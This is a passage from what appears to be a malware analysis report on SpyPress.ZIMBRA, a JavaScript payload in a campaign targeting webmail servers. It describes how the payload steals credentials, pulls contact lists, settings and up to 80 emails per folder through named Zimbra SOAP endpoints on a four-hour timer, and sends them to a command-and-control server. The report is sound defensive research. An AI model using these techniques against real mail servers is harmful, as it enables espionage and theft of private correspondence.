<li>exfiltration of contacts and settings, and</li>
<li>exfiltration of email messages.</li>
</ul>
<h4>Capabilities</h4>
<h5>Credential stealer</h5>
<p>The credential stealer of SpyPress.ZIMBRA is almost identical to those of SpyPress.HORDE and SpyPress.MDAEMON. The only difference is the name of the input fields, which are <span style="font-family: courier new, courier, monospace;">username</span> and <span style="font-family: courier new, courier, monospace;">password</span>, to match the official names used in the Zimbra software.</p>
<h5>Exfiltration of contacts and settings</h5>
<p>SpyPress.ZIMBRA fetches the victim&rsquo;s contact list by making a <a href="https://wiki.zimbra.com/wiki/SOAP_API_Reference_Manual">SOAP</a> request to the Zimbra API endpoint <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/service/soap/SearchRequest</span>. As shown in Figure 20, the search query is contained in a dictionary that it is sent to the Zimbra server in the body of a POST request. Finally, SpyPress.ZIMBRA exfiltrates the raw output to the C&amp;C server.</p>
<figure class="image"><img title="Figure 20. SpyPress.ZIMBRA gets the victim&rsquo;s contact list" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-20.png" alt="Figure 20. SpyPress.ZIMBRA gets the victim&rsquo;s contact list" width="" height="" />
<figcaption><em>Figure 20. SpyPress.ZIMBRA gets the victim&rsquo;s contact list</em></figcaption>
</figure>
<p>SpyPress.ZIMBRA also exfiltrates to the C&amp;C server the content of the global variable <span style="font-family: courier new, courier, monospace;">ZmSetting</span>, which contains various configuration and preference values. This is similar to SpyPress.ROUNDCUBE, which exfiltrates the about page.</p>
<h5>Email exfiltration</h5>
<p>Every 14,400 seconds (four hours), using the <span style="font-family: courier new, courier, monospace;">setInterval</span> function, this payload starts its email exfiltration routine.</p>
<p>As for the previous payloads, SpyPress.ZIMBRA first lists the folders, then iterates over the first 80 emails in each folder via a SOAP request to <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/service/soap/SearchRequest</span>. For each message, the script fetches the source at <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/service/home/~/?auth=co&amp;view=text&amp;id=&lt;email_ID&gt;</span> and then exfiltrates the email message source &ndash; see Figure 21.</p>
<figure class="image"><img title="Figure 21.SpyPress.ZIMBRA exfiltrates email messages" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-21.png" alt="Figure 21.SpyPress.ZIMBRA exfiltrates email messages" width="" height="" />
<figcaption><em>Figure 21.SpyPress.ZIMBRA exfiltrates email messages</em></figcaption>
</figure>
<h4>Network protocol</h4>
<p>SpyPress.ZIMBRA uses the same network protocol as SpyPress.HORDE.</p>
<h2>Conclusion</h2>
<p>Over the past two years, webmail servers such as Roundcube and Zimbra have been a major target for several espionage groups such as Sednit, GreenCube, and Winter Vivern. Because many organizations don&rsquo;t keep their webmail servers up to date and because the vulnerabilities can be triggered remotely by sending an email message, it is very convenient for attackers to target such servers for email theft.</p>
